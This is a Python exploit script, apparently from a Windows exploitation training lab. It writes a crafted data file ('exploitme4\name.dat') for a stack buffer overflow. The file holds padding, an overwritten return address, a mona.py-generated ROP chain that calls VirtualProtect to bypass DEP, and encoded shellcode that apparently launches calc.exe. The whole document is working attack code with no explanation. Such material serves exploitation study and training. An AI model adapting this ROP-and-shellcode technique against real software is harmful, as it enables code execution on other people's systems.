import struct

p32 = lambda x : struct.pack('<I', x)

kernel32 = 0x776e0000
ntdll = 0x77b10000
msvcr120 = 0x6f980000

shellcode = (
	"\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02"+
	"\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa"+
	"\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8"+
	"\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02"+
	"\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45"+
	"\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6"+
	"\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c"+
	"\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0"+
	"\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53"+
	"\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45"+
	"\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2"+
	"\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b"+
	"\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff"+
	"\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0"+
	"\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75"+
	"\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d"+
	"\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c"+
	"\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24"+
	"\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04"+
	"\x30\x03\xc6\xeb\xdd")

def create_rop_chain():
	# rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
	msvcr120 + 0xdb64c,     # POP ECX # RETN [MSVCR120.dll] 
	kernel32 + 0x1924,      # ptr to &VirtualProtect() [IAT kernel32.dll] 
	# Mona tends to return pointer to &VirtualProtectEx()
	# It is required to find correct pointer to &VirtualProtect() manually

	msvcr120 + 0x68f5f,     # MOV EAX,DWORD PTR DS:[ECX] # RETN [MSVCR120.dll] 
	ntdll + 0x89d85,        # XCHG EAX,ESI # RETN [ntdll.dll] 
	msvcr120 + 0x7d5cb,     # POP EBP # RETN [MSVCR120.dll] 
	ntdll + 0xa0ad0,        # & jmp esp [ntdll.dll] 

	# Modified; ebx = 0x400 (dwSize)
	ntdll + 0xcb3e5,        # POP EBX # RETN [ntdll.dll] 
	0x11110511,             # 0x11110511 -> ebx
	msvcr120 + 0x829d2,     # POP ECX # RETN [MSVCR120.dll]
	0xeeeefeef,             # 0xeeeefeef -> ecx
	msvcr120 + 0x46628,     # add ebx,ecx # sub al,0x24 # pop edx # retn; 0x400 -> ebx
	0xffffffff,             # for_edx

	# Modified; edx = 0x40 (NewProtect = PAGE_EXECUTE_READWRITE)
	ntdll + 0x34961,        # POP EDX # RETN [ntdll.dll] 
	0x01010141,             # 0x1010141 -> edx
	msvcr120 + 0x20cdb,     # POP EDI # RETN [MSVCR120.dll]
	0xfefefeff,             # 0xfefefeff -> edi
	msvcr120 + 0x39de1,     # add edx,edi # retn

	msvcr120 + 0x829d2,     # POP ECX # RETN [MSVCR120.dll] 
	kernel32 + 0xc666e,     # &Writable location [kernel32.dll] 
	msvcr120 + 0x20cdb,     # POP EDI # RETN [MSVCR120.dll]
	msvcr120 + 0x692bd,     # RETN (ROP NOP) [MSVCR120.dll] 
	msvcr120 + 0x3dd01,     # POP EAX # RETN [MSVCR120.dll] 
	0x90909090,             # nop
	kernel32 + 0x307f0,     # PUSHAD # RETN [kernel32.dll] 
	]
	return ''.join(p32(x) for x in rop_gadgets)

def write_file(file_path):
	with open(file_path, 'wb') as f:
		readable_addr = kernel32
		retn = kernel32 + 0x52357   # retn

		payload = 'a' * 32
		payload += p32(readable_addr)
		payload += p32(retn)
		payload += create_rop_chain()
		payload += shellcode

		f.write(payload)

write_file('c:\\exploitme4\\name.dat')